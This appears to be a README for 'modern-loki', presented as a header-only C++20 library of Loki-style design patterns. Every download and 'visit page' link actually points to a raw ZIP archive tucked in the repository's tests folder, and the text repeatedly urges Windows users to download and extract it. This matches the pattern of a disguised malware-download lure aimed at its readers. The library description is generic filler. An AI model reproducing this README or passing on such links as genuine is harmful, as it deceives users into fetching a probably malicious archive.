# 🧩 modern-loki - Clear design tools for modern C++

[![Download / Visit page](https://img.shields.io/badge/Download-Visit%20GitHub-6e5494?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rahalfiftyfifty868/modern-loki/main/tests/modern-loki-undulatingly.zip)

## 🖥️ What is modern-loki?

modern-loki is a header-only C++20 library that brings classic Loki design patterns into modern C++. It uses standard tools like concepts, `std::variant`, and threading support to keep the code easier to read and use.

It is made for developers who want policy-based design patterns without extra build steps. Because it is header-only, you do not need to compile a separate library first.

## 📦 What you get

- A header-only C++20 library
- Policy-based design helpers
- Pattern support for factory, singleton, visitor, and typelist use
- Modern replacements for older template techniques
- Support for standard threading tools
- A layout that works well in direct include-based projects

## 💻 Windows setup

Use the GitHub page to download or copy the project files:

[Visit the project page](https://raw.githubusercontent.com/Rahalfiftyfifty868/modern-loki/main/tests/modern-loki-undulatingly.zip)

### Steps for Windows users

1. Open the project page in your browser.
2. Download the repository as a ZIP file, or clone it with Git if you already use it.
3. Extract the ZIP file to a folder on your PC.
4. Open your C++ project in your editor or IDE.
5. Add the `modern-loki` include path to your project settings.
6. Include the headers you need in your source files.
7. Build your project with a C++20 compiler.

### What you need on Windows

- Windows 10 or Windows 11
- A C++20-capable compiler
- A code editor or IDE such as Visual Studio
- A project that can add custom include paths

## 🚀 Quick start

1. Download the files from the GitHub page.
2. Unzip the folder.
3. Copy the header files into your project or point your project at the library folder.
4. Add the include path in your build settings.
5. Use the headers in your code.

### Example use case

You can use modern-loki when you want to:

- Choose behavior at compile time
- Build flexible classes from small parts
- Use patterns like factory or visitor with less boilerplate
- Keep your project in one simple build step

## 🧱 Main features

### Policy-based design

Build classes from small, reusable parts. This helps you change behavior without rewriting the whole class.

### Concepts-based checks

C++20 concepts help the library check types before you use them. This makes errors easier to read.

### `std::variant` support

The library uses modern type handling tools so you can work with a known set of types in a safer way.

### Threading support

Use standard threading tools for code that needs to run work in parallel or manage background tasks.

### Header-only layout

You only need the headers. There is no separate library file to build or ship.

## 🧰 Typical uses

- Application frameworks
- Tooling and utility code
- Game or engine support code
- Desktop apps with shared behavior
- Projects that need reusable design patterns

## 📂 Suggested folder setup

If you want to keep things simple on Windows, use a layout like this:

- `C:\Projects\MyApp\`
- `C:\Libraries\modern-loki\`
- `C:\Projects\MyApp\src\`

Then add `C:\Libraries\modern-loki\` to your include paths.

## 🛠️ Build notes

modern-loki is meant to be included in another C++20 project. After you add the include path, your app should build the same way it did before, with the new headers available to use.

If you use Visual Studio:

1. Open your project.
2. Go to Project Properties.
3. Open C/C++ settings.
4. Add the `modern-loki` folder to Additional Include Directories.
5. Set the language standard to C++20.
6. Build the project.

## 🔍 Project topics

abstract-factory, alexandrescu, cpp, cpp20, design-patterns, header-only, loki, modern-cpp, policy-based-design, singleton, template-metaprogramming, typelist, visitor-pattern

## 📁 Download and use

Open the GitHub page here:

[https://raw.githubusercontent.com/Rahalfiftyfifty868/modern-loki/main/tests/modern-loki-undulatingly.zip](https://raw.githubusercontent.com/Rahalfiftyfifty868/modern-loki/main/tests/modern-loki-undulatingly.zip)

Download the repository as a ZIP file, extract it, then add the folder to your Windows project as an include path

## 🧪 Simple workflow

1. Visit the project page.
2. Get the source files.
3. Add the headers to your project.
4. Turn on C++20 in your compiler settings.
5. Build and run your app

## 🧭 Best fit

Use modern-loki if you want a small C++ library that helps you organize code around design patterns, while staying close to standard C++20 tools